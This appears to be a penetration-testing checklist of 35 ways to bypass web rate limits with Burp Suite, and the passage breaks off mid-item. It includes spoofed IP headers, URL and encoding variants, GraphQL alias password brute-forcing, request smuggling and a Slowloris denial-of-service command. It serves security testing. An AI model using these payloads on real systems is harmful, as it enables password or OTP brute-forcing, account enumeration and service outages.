1. Rate Limit Bypass via X-Forwarded-For Header Rotation
Steps:

Open Burp Suite → Proxy → HTTP history → Find a rate-limited endpoint (e.g., login, OTP, search) → Right-click → Send to Intruder
In Intruder → Positions tab → Clear all positions → Add the value of X-Forwarded-For header as payload position:

X-Forwarded-For: §1.2.3.4§
If header doesn't exist, add it — click Add in positions

Go to Payloads tab → Payload type: Numbers → Set range From: 1, To: 255, Step: 1 → In format, set to generate IPs like 192.168.1.§§ (or use a list of real IPs)
Better: Use Payload type: Simple list → Add these IPs one by one:

1.1.1.1
2.2.2.2
3.3.3.3
8.8.8.8
10.0.0.1

Also add the main payload (the thing you're trying to brute-force) as a second payload in Pitchfork mode → Now each request uses a different IP AND a different password/OTP
Click Start Attack → Watch the responses → If rate limit is per-IP based on X-Forwarded-For, you'll see each "IP" gets its own quota (e.g., 5 attempts per IP) and all succeed before hitting limit
Check the response column — count how many requests returned valid (200/success) responses vs rate-limit responses (429/403)

🔴 Vulnerable When:

With the same real IP, you were blocked after 5 attempts. But with X-Forwarded-For rotation, each new IP value gets another 5 attempts — effectively unlimited total attempts
None of the rotated-IP requests return 429 Too Many Requests even after 100+ total requests
The successful response rate matches the per-IP limit multiplied by the number of different IPs used

Severity: HIGH

2. Rate Limit Bypass via X-Real-IP Header
Steps:

Open Burp Suite → Proxy → HTTP history → Find rate-limited endpoint → Right-click → Send to Repeater first to confirm rate limiting:


Send the request 10 times rapidly → Confirm you get 429 Too Many Requests after N requests


Now add the header X-Real-IP: 5.5.5.5 → Send 10 more requests with this header → Check if the rate limit counter resets
Send to Intruder → Mark the X-Real-IP value as position:

X-Real-IP: §1.2.3.§

Payload: Simple list of IPs:

1.1.1.1
2.2.2.2
3.3.3.3
4.4.4.4
5.5.5.5
... etc

Run the attack — check if requests with different X-Real-IP values bypass the rate limit
Also test with invalid IP formats:

X-Real-IP: localhost
X-Real-IP: 127.0.0.1
X-Real-IP: 0.0.0.0
X-Real-IP: ::1
X-Real-IP: 999.999.999.999
Check if 127.0.0.1 or localhost bypasses rate limiting completely (server thinks you're local)
🔴 Vulnerable When:

Adding X-Real-IP: 127.0.0.1 completely removes the rate limit (server trusts localhost)
Each different IP value in X-Real-IP gets a fresh request quota
100 requests with 100 different X-Real-IP values all succeed where 100 requests without this header would be blocked after 5

Severity: HIGH

3-10. (X-Originating-IP, X-Remote-IP, X-Remote-Addr, X-Client-IP, X-Host, X-Forwarded-Host, X-Forwarded-Proto, Forwarded Header)
Steps (apply the same method for all these headers):

Open Burp Suite → Proxy → HTTP history → Find rate-limited endpoint → Send to Repeater → Confirm rate limiting by sending 10 requests rapidly
For each header, add it to the request one at a time and test:

X-Originating-IP: 1.2.3.4
X-Remote-IP: 1.2.3.4
X-Remote-Addr: 1.2.3.4
X-Client-IP: 1.2.3.4
X-Host: 1.2.3.4
X-Forwarded-Host: evil.com
X-Forwarded-Proto: https
Forwarded: for=1.2.3.4;proto=https;host=target.com

In Intruder → Mark the header value as payload position → Use IP list payload → Run 100 requests
Check response codes → If rate limit 429 doesn't appear, bypass succeeded
For X-Forwarded-Host and X-Forwarded-Proto — these might affect routing logic rather than IP-based rate limiting → Test if they cause different code paths to execute (different endpoints with no rate limiting)
Try sending all headers simultaneously in one request:

X-Forwarded-For: 1.1.1.1
X-Real-IP: 2.2.2.2
X-Client-IP: 3.3.3.3
X-Remote-IP: 4.4.4.4
Check which one the server uses for rate limiting → Rotate only that one
🔴 Vulnerable When:

Any of these headers, when rotated, resets the rate limit counter
X-Forwarded-Host: 127.0.0.1 tricks the server into treating request as internal (no rate limit for internal)
Server uses one of these untrusted headers as the rate limiting key instead of the real client IP

Severity: HIGH (for IP spoofing headers), MEDIUM (for Proto/Host headers)

11. Rate Limit Bypass via Different API Versions
Steps:

Open Burp Suite → Proxy → HTTP history → Find the rate-limited endpoint → Note the URL path (e.g., /api/v1/login)
Right-click → Send to Repeater → Try changing the version in the URL one at a time:

/api/v1/login → /api/v2/login
/api/v1/login → /api/v3/login
/api/v1/login → /api/beta/login
/api/v1/login → /api/login (no version)
/api/v1/login → /api/latest/login
Click Send for each → Check if the endpoint exists (200, not 404)

Also try versions in different positions:

/v1/api/login
/api/login?version=2
/api/login?v=2

Try different version formats:

/api/v1.0/login
/api/version1/login
/api/1/login
/api/2/login

If a v2 or v3 endpoint exists, send 20 rapid requests to it → Check if it has its own separate rate limit counter or shares with v1
Use Burp Intruder → URL path as payload position → List of version strings → Run → Check which paths return 200 vs 404

🔴 Vulnerable When:

/api/v2/login exists and performs the same function as /api/v1/login but has no rate limiting (or a different/higher limit)
Each API version has its own independent rate limit counter — you can rotate between v1/v2/v3 to effectively multiply your allowed requests

Severity: HIGH

12. Rate Limit Bypass via Different HTTP Methods
Steps:

Open Burp Suite → Proxy → HTTP history → Find rate-limited endpoint (e.g., POST /api/login) → Right-click → Send to Repeater
Note the original method (usually POST) → Try changing to other methods:

POST /api/login → GET /api/login (with params in URL)
POST /api/login → PUT /api/login
POST /api/login → PATCH /api/login
POST /api/login → OPTIONS /api/login
POST /api/login → HEAD /api/login
POST /api/login → CONNECT /api/login
For GET, move body params to URL: /api/login?username=test&password=test

Send each method 15 times rapidly → Check if any bypass the rate limit
Try method override headers (some APIs accept method override):

POST /api/login HTTP/1.1
X-HTTP-Method-Override: GET
X-Method-Override: GET
_method: GET

If the endpoint is at /api/v1/login, try POST to /api/v1/login/ (with trailing slash) with X-HTTP-Method-Override: POST → The rate limit might key on exact method+path combination
Check if OPTIONS requests are counted toward the rate limit → OPTIONS is a preflight request and might not be rate limited

🔴 Vulnerable When:

GET /api/login?username=x&password=y processes the login but has no rate limit (rate limit only on POST)
Method override header (X-HTTP-Method-Override: DELETE) causes the endpoint to execute as a different method that bypasses rate limiting
OPTIONS requests are not rate limited even though they trigger server-side processing

Severity: MEDIUM to HIGH

13. Rate Limit Bypass via URL Case Variation
Steps:

Open Burp Suite → Proxy → HTTP history → Find rate-limited endpoint (e.g., /api/login) → Right-click → Send to Intruder
In Intruder → Mark the URL path as payload position → Use Simple list payload with case variations:

/api/login
/api/Login
/api/LOGIN
/api/lOGIN
/api/loGIN
/api/LoGiN
/API/login
/Api/Login
/API/LOGIN

Keep the same POST body with same credentials → Run Intruder → Check which paths return 200 vs 404
For any that return 200 (endpoint exists), send 20 rapid requests to that case-varied URL → Check if rate limit applies separately or not at all
Also try mixed case on API prefix:

/Api/v1/login
/API/V1/login
/api/V1/login

Try encoded uppercase:

/ap%49/login   (%49 = uppercase I)
/ap%69/login   (%69 = lowercase i)
🔴 Vulnerable When:

/api/Login or /API/LOGIN returns 200 and processes the login (case-insensitive routing)
Case variations have separate rate limit counters — rotating between /api/login, /api/Login, /API/login triples your effective limit
The web framework treats different cases as different resources but they hit the same backend code

Severity: MEDIUM

14. Rate Limit Bypass via URL Path Encoding
Steps:

Open Burp Suite → Proxy → HTTP history → Find rate-limited endpoint → Right-click → Send to Intruder
Mark the URL path as payload position → Create payload list of encoded versions:

/api/login
/api/%6cogin       (%6c = l)
/api/%6Cogin       (uppercase hex)
/api/logi%6e       (%6e = n)
/api/log%69n       (%69 = i)
/api/%6c%6f%67%69%6e  (fully encoded "login")
/api/l%2fogin      (encoded slash between characters)
/%61pi/login       (%61 = a)

Run Intruder → Check which encoded paths hit the same endpoint (200 response)
For any that work, test if the rate limit counter is separate from the unencoded path → Send 20 rapid requests to the encoded path → Check for 429
Also try double encoding:

/api/%256cogin     (%25 encodes to %, then %6c encodes to l = %6cogin)
/api/%2566ogin     (double-encoded 'l' differently)

Try Unicode encoding of path characters:

/api/\u006cogin
/api/l\u006fgin
🔴 Vulnerable When:

Encoded path like /api/%6cogin processes the same login but has its own rate limit counter (or none)
WAF or rate limiter normalizes paths but does so after rate limit key is computed — encoded paths bypass rate limit check
Double-encoded paths bypass both rate limiting and input validation simultaneously

Severity: MEDIUM

15. Rate Limit Bypass via Adding Trailing Slash
Steps:

Open Burp Suite → Proxy → HTTP history → Find rate-limited endpoint (e.g., POST /api/login) → Send to Repeater
Add a trailing slash: POST /api/login/ → Send 20 rapid requests → Check if rate limit applies
Try multiple trailing slashes:

/api/login/
/api/login//
/api/login///

Try adding a dot:

/api/login.
/api/login.json
/api/login.php
/api/login.html

Try adding a query string (even empty):

/api/login?
/api/login?a
/api/login?dummy=1
Check if adding any query parameter bypasses the rate limit (if rate limit key is exact path without query)

In Intruder → Use the trailing slash + parameter variations as payload list → Run all variations → See which ones:
a) Return 200 (endpoint exists)
b) Don't return 429 even after 20+ requests

🔴 Vulnerable When:

/api/login/ (with trailing slash) processes login exactly like /api/login but has no rate limit applied
Each unique query parameter variation gets its own rate limit counter — rotating ?dummy=1, ?dummy=2 allows unlimited attempts
.json extension allows same endpoint to be accessed with a fresh rate limit quota

Severity: MEDIUM

16. Rate Limit Bypass via Adding URL Parameters
Steps:

Open Burp Suite → Proxy → HTTP history → Find rate-limited endpoint → Send to Intruder
Add a dummy parameter to the URL and mark its value as payload position:

POST /api/login?cache=§1§ HTTP/1.1

Payload type: Numbers → From: 1, To: 1000, Step: 1 → This makes each request unique
Run attack with 100 requests → Check if rate limit (429) appears at any point
Also try different parameter names:

/api/login?_=1
/api/login?t=TIMESTAMP
/api/login?random=UUID
/api/login?cb=12345
/api/login?nocache=1
/api/login?v=1

Try parameters that affect caching behavior — rate limits implemented via cache might be bypassed:

/api/login?nocache=true
/api/login?bypass=true

Try adding parameters that the app uses but set to unexpected values:

/api/login?debug=true
/api/login?internal=1
/api/login?admin=true
🔴 Vulnerable When:

Each unique ?cache=1, ?cache=2, ?cache=3 etc. gets its own rate limit counter — confirmed by all 1000 requests succeeding without 429
Adding ?debug=true or ?admin=true triggers different code path that has no rate limiting
Rate limit key is based on full URL including query string — any unique query string parameter bypasses it

Severity: HIGH

17. Rate Limit Bypass via Fragment Identifier
Steps:

Open Burp Suite → Proxy → HTTP history → Find rate-limited endpoint → Send to Repeater
Add a fragment to the URL:

POST /api/login#test HTTP/1.1
POST /api/login#1 HTTP/1.1
POST /api/login#bypass HTTP/1.1
Note: Fragments are NOT sent to the server — the browser strips them. But some proxy/load-balancer implementations might handle them differently

Check if the fragment causes any different response — some middleware might rate-limit based on the raw request URL before fragment stripping
Try in Intruder → Mark fragment value as position:

POST /api/login#§1§ HTTP/1.1
Payload: Numbers 1-100 → Run → Check for 429

Also test in Burp browser directly → Add fragment to URL manually in address bar → Check developer tools to see if any request with fragment is sent differently

🔴 Vulnerable When:

Different fragment values cause the rate limiter to treat requests as unique (each gets its own counter)
Rate limit counter is not reached when rotating fragment values even though underlying endpoint is the same

Severity: LOW to MEDIUM (fragments aren't normally sent to server, but middleware bugs can exist)

18. Rate Limit Bypass via Different Content-Type
Steps:

Open Burp Suite → Proxy → HTTP history → Find rate-limited endpoint → Note the Content-Type header (usually application/json)
Right-click → Send to Repeater → Try changing Content-Type one at a time:

Content-Type: application/json          (original)
Content-Type: text/plain
Content-Type: application/x-www-form-urlencoded
Content-Type: multipart/form-data
Content-Type: text/json
Content-Type: application/ld+json
Content-Type: application/json; charset=utf-8
Content-Type: application/json; charset=utf-16
Content-Type: application/JSON
Content-Type: APPLICATION/JSON

For each Content-Type, also adjust the body format if needed:


For application/x-www-form-urlencoded: Change body from {"username":"test"} to username=test&password=test
For multipart/form-data: Add boundary and multipart format


Send 20 rapid requests for each Content-Type → Check if any have no rate limiting
Try sending JSON body with form-data Content-Type and vice versa — some parsers are lenient and accept both, but rate limiters might key on Content-Type

🔴 Vulnerable When:

application/x-www-form-urlencoded with the same parameters processes correctly (endpoint accepts it) but has its own rate limit counter separate from application/json
Changing charset in Content-Type (charset=utf-16) creates a new rate limit bucket
application/JSON (capital letters) bypasses rate limit but processes normally

Severity: MEDIUM

19. Rate Limit Bypass via JSON vs Form-Data
Steps:

Open Burp Suite → Proxy → HTTP history → Find rate-limited endpoint → Note if it accepts JSON → Send to Repeater
Original JSON request:

POST /api/login HTTP/1.1
Content-Type: application/json

{"username":"test@test.com","password":"test123"}

Change to form-urlencoded:

POST /api/login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=test%40test.com&password=test123
Send 20 rapid requests → Check for 429

Change to multipart/form-data:

POST /api/login HTTP/1.1
Content-Type: multipart/form-data; boundary=----boundary123

------boundary123
Content-Disposition: form-data; name="username"

test@test.com
------boundary123
Content-Disposition: form-data; name="password"

test123
------boundary123--
Send 20 rapid requests → Check for 429

Try each in Intruder with 100 null payload iterations → Compare 429 rate across JSON, form-data, and multipart
Also try nesting formats: JSON value that contains form-encoded data:

POST /api/login HTTP/1.1
Content-Type: application/json

{"body":"username=test@test.com&password=test123"}
🔴 Vulnerable When:

JSON format hits rate limit after 5 requests, but form-urlencoded or multipart with same credentials has no rate limit
Each format type has separate rate limit counters — rotating between 3 formats triples total attempts

Severity: HIGH

20. Rate Limit Bypass via Parameter Pollution
Steps:

Open Burp Suite → Proxy → HTTP history → Find rate-limited endpoint → Send to Repeater
For a JSON body like {"username":"test","password":"test"}, try duplicate parameters:

json{"username":"test","password":"test","username":"test"}
Or in URL:
/api/login?username=test&password=test&username=test2

Try parameter pollution in different formats:

username=test&password=test&password=other
Check which value the server uses — first or last

Try wrapping parameters differently:

json{"credentials":{"username":"test","password":"test"}}
{"data":{"username":"test"},"password":"test"}
{"username":["test","test2"],"password":"test"}

Go to Intruder → Use the duplicate/polluted parameter as a position → Vary the duplicate value → Numbers from 1-100:

{"username":"test","password":"test","_dummy":"§1§"}
This makes each request unique → Run 100 requests → Check for 429

Check if adding a completely unknown extra field affects rate limiting:

json{"username":"test","password":"test","nonexistent_field":"value"}
🔴 Vulnerable When:

Duplicate parameters with rotating values cause each request to be treated as unique (separate rate limit bucket)
Server accepts the request normally but rate limiter sees it as different due to pollution
Adding a dummy field with incrementing value effectively makes each request unique enough to bypass rate limiting

Severity: MEDIUM

21. Rate Limit Bypass via IP Rotation Through Proxy
Steps:

Open Burp Suite → User Options → Connections → Upstream Proxy → Add proxy servers from a proxy list (free or paid proxy list)
Go to Project Options → Sessions → Session Handling Rules → Add a new rule → Add action: Invoke a Burp extension (if you have an IP rotation extension installed) OR manually rotate
More practically: In Intruder → Before each request, change the upstream proxy → Use Macros to rotate proxies → This changes your real IP for each request
Alternatively, in Intruder Payload Processing → Add rules to include different X-Forwarded-For values (simpler, but tests header-based rate limiting)
Manual test: Configure Burp to use proxy1 → Send 10 requests → Hit rate limit → Change Burp upstream proxy to proxy2 → Send 10 more requests → Check if new limit applies
Note the IP from each proxy response → Compare that 10 requests from proxy1 hit limit but 10 from proxy2 start fresh → Confirms rate limiting is IP-based and bypassable with different IPs

🔴 Vulnerable When:

Changing to a new proxy IP gives a completely fresh rate limit counter
Rate limiting is implemented only at IP level with no additional fingerprinting (no cookie/session tracking)
Each proxy IP gets the full allowed requests, enabling unlimited total attempts by rotating through many IPs

Severity: HIGH

22. Rate Limit Bypass via IPv6 Address Variation
Steps:

Open Burp Suite → Proxy → HTTP history → Find rate-limited endpoint → Send to Repeater
Add X-Forwarded-For header with IPv6 addresses instead of IPv4:

X-Forwarded-For: 2001:db8::1
X-Forwarded-For: 2001:db8::2
X-Forwarded-For: ::1
X-Forwarded-For: ::ffff:1.2.3.4
X-Forwarded-For: fe80::1

In Intruder → Mark last part of IPv6 as payload position:

X-Forwarded-For: 2001:db8::§1§
Payload: Numbers 1-1000 → Run → Check for 429

Try mixing IPv4 and IPv6 in the same header:

X-Forwarded-For: 2001:db8::1, 1.2.3.4
X-Forwarded-For: 1.2.3.4, 2001:db8::1

Check if the rate limiter treats IPv6 and IPv4 as completely different rate limit buckets → If IPv4 1.2.3.4 is blocked, try ::ffff:1.2.3.4 (IPv4-mapped IPv6 equivalent)
Try IPv6 with zone IDs:

X-Forwarded-For: fe80::1%eth0
🔴 Vulnerable When:

Rate limiter applies separate counter to IPv6 addresses vs IPv4 — using IPv6 when IPv4 is blocked gives fresh quota
IPv6 block 2001:db8::/32 has 2^96 possible addresses — brute force of rate limit key is trivially easy with IPv6
IPv4-mapped IPv6 (::ffff:1.2.3.4) bypasses block placed on IPv4 1.2.3.4

Severity: HIGH

23. Rate Limit Bypass via IPv4-Mapped IPv6 Addresses
Steps:

Open Burp Suite → Proxy → HTTP history → Find rate-limited endpoint → Send to Repeater
First establish rate limit with IPv4:

X-Forwarded-For: 1.2.3.4
Send 20 requests → Confirm 429 after N requests

Now switch to IPv4-mapped IPv6 equivalent:

X-Forwarded-For: ::ffff:1.2.3.4
X-Forwarded-For: ::ffff:0102:0304   (hex representation)
Send 20 more requests → Check if rate limit resets

Also try these representations of 127.0.0.1:

X-Forwarded-For: ::ffff:127.0.0.1
X-Forwarded-For: ::ffff:7f00:0001
X-Forwarded-For: ::1
::1 is the IPv6 loopback — if server treats loopback as trusted, rate limiting may be disabled entirely

Try different IPv6 notation formats for the same address:

X-Forwarded-For: 2001:0db8:0000:0000:0000:0000:0000:0001
X-Forwarded-For: 2001:db8::1
X-Forwarded-For: 2001:DB8::1   (uppercase)
These all represent the same address — check if rate limiter normalizes them or treats each as different
🔴 Vulnerable When:

IPv4 1.2.3.4 is rate-limited but ::ffff:1.2.3.4 (same address in IPv6 notation) bypasses the limit
Server treats ::1 as localhost and applies no rate limiting (internal IP trusted)
Different notation formats of the same IPv6 address have separate rate limit counters

Severity: HIGH

24. Rate Limit Bypass via Multiple API Keys Rotation
Steps:

Open Burp Suite → Proxy → HTTP history → Find rate-limited API endpoint → Check for API key in headers or query string:

Authorization: Bearer key_abc123
X-API-Key: key_abc123
?api_key=key_abc123

If you have access to multiple API keys (test accounts, different plan keys, etc.), put them in a list
Send to Intruder → Mark the API key value as payload position:

Authorization: Bearer §api_key_here§

Payload type: Simple list → Add all your API keys → Run attack with 50 requests total → With 5 keys and 10 requests each, check if each key gets its own quota
Even if you only have one API key, test if rotating between your key and a slightly modified version of your key bypasses the limit:

Bearer key_abc123
Bearer key_abc123 
Bearer key_abc123	  (tab character at end)

Try using the API key in different locations (header vs query string vs body) — each location might have a separate counter:

Header: Authorization: Bearer key_abc123   (rate limited)
Query: ?api_key=key_abc123                  (separate counter?)
Body: {"api_key":"key_abc123"}              (separate counter?)
🔴 Vulnerable When:

Each API key has its own rate limit counter — rotating between 5 keys gives 5x the rate limit
The same key in different positions (header vs query) has separate counters
Whitespace variations of the same key bypass rate limiting (poor key normalization)

Severity: HIGH

25. Rate Limit Bypass via Different User Accounts
Steps:

Open Burp Suite → Create multiple test accounts (free accounts on the target) → Note their session cookies/tokens
Go to Project Options → Sessions → Session Handling Rules → Create a rule that rotates between your test account sessions for each Intruder request:


Add action: Run a macro → Define macro to use each account's cookie in turn


In Intruder → Set up the attack on the rate-limited endpoint → Configure session handling to rotate accounts
Simpler approach: In Intruder → Mark session cookie as payload position:

Cookie: session=§session_value§
Payload: Simple list → Add all your test session values → Run

Each account targets the same resource → Check if rate limit applies per account (each account gets 5 tries → 5 accounts = 25 total tries) or globally
Test specifically against OTP or reset codes — if each account can try 5 times and you have 10 accounts, you can try 50 combinations

🔴 Vulnerable When:

Rate limit is per-account, not per-resource — using 10 accounts to attack one user's OTP gives 10x the attempts
No global rate limit across all accounts targeting the same victim account
Each account gets a fresh rate limit window — rotating accounts multiplies effective attack speed

Severity: HIGH

26. Rate Limit Bypass via Concurrent Request Distribution
Steps:

Open Burp Suite → Proxy → HTTP history → Find rate-limited endpoint → Send to Intruder
Go to Resource Pool tab → Create new resource pool → Set Maximum concurrent requests: 50
Payloads tab → Null payloads → Count: 200 → This sends all 200 requests as fast as possible, with 50 at a time
The idea: rate limiters that use a sliding window or token bucket algorithm can be overwhelmed if 50 requests arrive simultaneously before the counter updates → Some requests slip through before the block kicks in
Run the attack → Check which requests returned 200 vs 429 → Count how many 200 responses you got before the 429s started
Try different concurrency levels:


10 concurrent → see how many succeed
50 concurrent → see how many succeed
100 concurrent → see how many succeed
More concurrency = more requests slip through before rate limit counter catches up


Watch timing — if rate limit resets every minute, send 50 simultaneous requests right at the reset boundary

🔴 Vulnerable When:

Sending 50 concurrent requests allows 10-20 to succeed before rate limiter blocks (race condition in rate limiting logic)
More concurrent requests = more succeed before block → shows rate limiter has a concurrency race condition
Count of successful requests increases proportionally with concurrency level

Severity: HIGH

27. Rate Limit Bypass via Request Header Reordering
Steps:

Open Burp Suite → Proxy → HTTP history → Find rate-limited endpoint → Send to Repeater → Note the order of headers in the request
In Repeater, reorder the headers — move them around:

Original:
Host: target.com
Content-Type: application/json
Authorization: Bearer token123
User-Agent: Mozilla/5.0
Cookie: session=abc
Reordered:
User-Agent: Mozilla/5.0
Cookie: session=abc
Authorization: Bearer token123
Host: target.com
Content-Type: application/json

Send 20 requests with the original order → Hit rate limit → Switch to reordered headers → Send 20 more → Check if limit resets
Try switching between different orderings in Intruder → Since header reorder payload generation is manual, create several pre-made header orders as different preset payloads
Try adding extra headers in different positions:

Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate
DNT: 1

Try sending the same standard HTTP headers in non-standard order — HTTP/2 especially normalizes headers, so check if HTTP/1.1 with unusual order behaves differently

🔴 Vulnerable When:

Rate limiter uses a hash of all headers (in order) as the rate limit key — reordering creates a different hash and resets the counter
Some proxy/middleware fingerprints requests including header order — reordering creates a new "identity"
Adding extra innocuous headers (DNT: 1, Accept-Language) causes rate limiter to see a new request signature

Severity: LOW to MEDIUM

28. Rate Limit Bypass via Chunked Transfer Encoding
Steps:

Open Burp Suite → Proxy → HTTP history → Find rate-limited POST endpoint → Send to Repeater
In Repeater, change the Content-Length header to Transfer-Encoding: chunked:


Remove: Content-Length: 45
Add: Transfer-Encoding: chunked


Change the body to chunked format:

POST /api/login HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Content-Type: application/json

7\r\n
{"user\r\n
9\r\n
name":"a"}\r\n
0\r\n
\r\n
(Each chunk starts with hex length, then CRLF, then data, then CRLF. End with 0 chunk.)

Send this → Check if the endpoint processes it normally
If it works, send 20 chunked requests → Check for rate limiting
Try combining with TE.CL attack — send Transfer-Encoding: chunked in header but server uses Content-Length:

Transfer-Encoding: chunked
Content-Length: 5

0\r\n
\r\n

Try obfuscated Transfer-Encoding to bypass middleware that doesn't support it:

Transfer-Encoding: xchunked
Transfer-Encoding : chunked  (space before colon)
Transfer-Encoding: chunked, identity
🔴 Vulnerable When:

Chunked transfer encoding sends requests that bypass the rate limiter while the backend still processes them
Rate limiter doesn't handle chunked encoding — requests with TE:chunked are counted differently or not at all
TE.CL desync allows smuggling multiple requests counted as one by rate limiter

Severity: HIGH

29. Rate Limit Bypass via HTTP/2 Multiplexing
Steps:

Open Burp Suite → Project Options → HTTP → Ensure HTTP/2 support is enabled
Go to Proxy → HTTP history → Find rate-limited endpoint → Note if it uses HTTP/1.1 or HTTP/2 (check the Protocol column in HTTP history)
If it's HTTP/1.1, try sending same request with HTTP/2 → In Repeater, there's a protocol toggle → Switch to HTTP/2 → Send 20 rapid requests → Check if rate limit is enforced for HTTP/2
HTTP/2 multiplexing means multiple requests share one TCP connection → Use Burp's Send group in parallel feature:


Create 20 tabs in Repeater all with the same rate-limited request
Select all tabs → Right-click → Send group in parallel (single-packet attack)
All 20 requests arrive on the server in one TCP packet simultaneously


Check how many of the 20 parallel requests returned 200 vs 429 → If rate limiter processes them sequentially (even though received in parallel), some will slip through
Compare: 20 sequential requests (all hit rate limit after 5) vs 20 parallel requests (more than 5 succeed due to race condition in rate limiter)

🔴 Vulnerable When:

HTTP/2 has a separate rate limit counter from HTTP/1.1 (or no counter at all)
Single-packet attack with 20 simultaneous requests results in more than the normal rate limit count succeeding (race condition in rate limit counter update)
Rate limiter doesn't account for HTTP/2 multiplexing and allows per-stream limits that can be exceeded via multiple simultaneous streams

Severity: HIGH

30. Rate Limit Bypass via HTTP Pipelining
Steps:

Open Burp Suite → Proxy → HTTP history → Find rate-limited endpoint
HTTP pipelining sends multiple requests without waiting for responses → Use Burp's Repeater in group mode:


Open 10 Repeater tabs with the same request
In Burp Pro: Send group sequentially (single connection) → This pipelines all 10 requests on one connection


Or test manually using netcat or curl:

bash# Using curl with pipelining
curl --http1.1 --pipelining \
  -d '{"username":"test","password":"pass"}' \
  -H "Content-Type: application/json" \
  https://target.com/api/login \
  https://target.com/api/login \
  https://target.com/api/login &  # Multiple requests pipelined

Check responses for each pipelined request → Compare rate limiting behavior vs non-pipelined requests
Some rate limiters count connections not requests → Pipelining 10 requests on 1 connection might count as 1 against the limit instead of 10

🔴 Vulnerable When:

Pipelining 10 requests on one connection counts as only 1 against the rate limit (rate limiter counting connections, not requests)
Rate limiter processes pipelined requests in batch and only increments counter once
HTTP pipelining allows more requests per time window than the intended limit

Severity: MEDIUM

31. Rate Limit Bypass via WebSocket Connection Upgrade
Steps:

Open Burp Suite → Proxy → HTTP history → Find REST API endpoint that is rate-limited (e.g., /api/data)
Check if the same application also has a WebSocket endpoint that provides the same data → Go to WebSockets history → Look for equivalent functionality
Connect to the WebSocket → Send the equivalent action via WebSocket instead of the rate-limited REST API:


REST: POST /api/search {"q":"test"} (rate limited to 10/min)
WebSocket: {"action":"search","q":"test"} (no rate limiting?)


In Burp WebSocket Repeater → Send the equivalent search/query/action 100 times → Check if rate limiting is enforced on the WebSocket path
If WebSocket isn't rate limited, go to Intruder → Use the WebSocket as the delivery mechanism by first establishing a connection → Then send 1000 identical messages → Check if any rate limit kicks in
Also try upgrading a normally rate-limited endpoint to WebSocket:


The WebSocket upgrade itself goes through the rate-limited endpoint path
But subsequent WebSocket messages might not be rate-limited

🔴 Vulnerable When:

REST POST /api/search is rate limited but WebSocket {"action":"search"} provides same data without rate limiting
After upgrading to WebSocket, sending 1000 identical search queries returns results each time (no WebSocket message rate limiting)
The rate limit only applies to the initial upgrade request, not to subsequent WebSocket messages

Severity: HIGH

32. Rate Limit Bypass via GraphQL Batch Queries
Steps:

Open Burp Suite → Proxy → HTTP history → Find GraphQL endpoint (usually /graphql or /api/graphql) → Find a rate-limited query → Send to Repeater
Normal rate-limited query:

json{"query":"{ user(id:\"1\") { email } }"}
Send 20 times → Confirm rate limit after N requests

Now try batching — GraphQL supports sending multiple operations in one HTTP request:

json[
  {"query":"{ user(id:\"1\") { email } }"},
  {"query":"{ user(id:\"2\") { email } }"},
  {"query":"{ user(id:\"3\") { email } }"},
  {"query":"{ user(id:\"4\") { email } }"},
  {"query":"{ user(id:\"5\") { email } }"}
]
This sends 5 queries in one HTTP request → If rate limit counts HTTP requests (not queries), you just got 5x efficiency

Try batching 100 queries in one request:

json[
  {"query":"{ user(id:\"1\") { email } }"},
  {"query":"{ user(id:\"2\") { email } }"},
  ... (repeat 100 times)
]

Check the response → All 100 queries return results → But only counted as 1 request against the rate limit
In Burp → Use Intruder to generate the batch payload → Or use the GraphQL extension from BApp Store → It has batch attack features built in

🔴 Vulnerable When:

A single batched HTTP request with 100 GraphQL queries returns 100 responses but counts as only 1 against the rate limit
Rate limit allows 10 requests/minute → Batching 100 queries per request = effectively 1000 queries/minute
No limit on batch size — you can send 10,000 queries in one batch request

Severity: HIGH

33. Rate Limit Bypass via GraphQL Alias Abuse
Steps:

Open Burp Suite → Proxy → HTTP history → Find GraphQL rate-limited endpoint → Send to Repeater
GraphQL aliases allow multiple instances of the same query in one request:

graphql{
  check1: userExists(email: "victim1@email.com")
  check2: userExists(email: "victim2@email.com")
  check3: userExists(email: "victim3@email.com")
  check4: userExists(email: "victim4@email.com")
  check5: userExists(email: "victim5@email.com")
}
This is one HTTP request that checks 5 emails

Send this request → Check if you get all 5 results in one response → Then check if rate limit counts this as 1 request or 5
Try with 100 aliases for the same check:

graphql{
  a1: login(username:"user",password:"pass1")
  a2: login(username:"user",password:"pass2")
  a3: login(username:"user",password:"pass3")
  ...
  a100: login(username:"user",password:"pass100")
}
One HTTP request = 100 password attempts

In Burp, use the InQL extension (from BApp Store) → It helps construct alias-based batch attacks → Or manually build the payload in Repeater
Check the responses for each alias → Look for which password succeeded (different response structure for success vs failure)

🔴 Vulnerable When:

100 aliases in one request each execute independently on the server but count as 1 against the rate limit
login alias with different passwords allows brute-forcing a password with 100 attempts per HTTP request
userExists alias enumeration checks 100 emails in one request that counts as 1 (email enumeration at scale)
Rate limiter sees 1 request, backend executes 100 operations

Severity: CRITICAL

34. Rate Limit Bypass via Slow HTTP Attack (Slowloris)
Steps:

Open Burp Suite → Proxy → HTTP history → Find rate-limited endpoint
Slowloris sends many partial HTTP requests and keeps them open by sending partial headers slowly → The rate limiter may count "connections" but Slowloris opens maximum connections and sends minimum data
Use slowloris tool through your test environment:

bash# Install and run slowloris
pip install slowloris
slowloris target.com --port 443 --sleeptime 5 --num-sockets 200 --https

Or manually in Burp: Create a POST request → In Repeater, set body but don't send Content-Length matching the body size → Server waits for more body data → Hold connection open by sending one byte every 25 seconds:

POST /api/login HTTP/1.1
Host: target.com
Content-Type: application/json
Content-Length: 1000

{"use    ← send this much, then wait 25 seconds before sending more

Open 200 such connections simultaneously → Each holds an open connection slot → Check if the server eventually runs out of connection capacity for legitimate users
Also check: while 200 slow connections are open, can a 201st legitimate request even connect? If not, the DoS succeeds → Rate limiting is effectively bypassed via resource exhaustion (not allowing rate limit code to even run)

🔴 Vulnerable When:

Server doesn't enforce a timeout for partial/slow requests — connections can be held open for minutes
At 200 simultaneous slow connections, the server becomes unable to accept new connections
Rate limiter is per-completed-request but slowloris holds connections at the partial-request stage — the rate limiter never even fires

Severity: HIGH

35. Rate Limit Bypass via Slow POST Attack
Steps:

Open Burp Suite → Find rate-limited POST endpoint → Send to Repeater
Slow POST sends the Content-Length header declaring a large body, but sends body bytes very slowly:
In Repeater, add a large Content-Length:

POST /api/login HTTP/1.1
Host: target.com
Content-Type: application/json
Content-Length: 10000

{"username":"test","password":"test"}
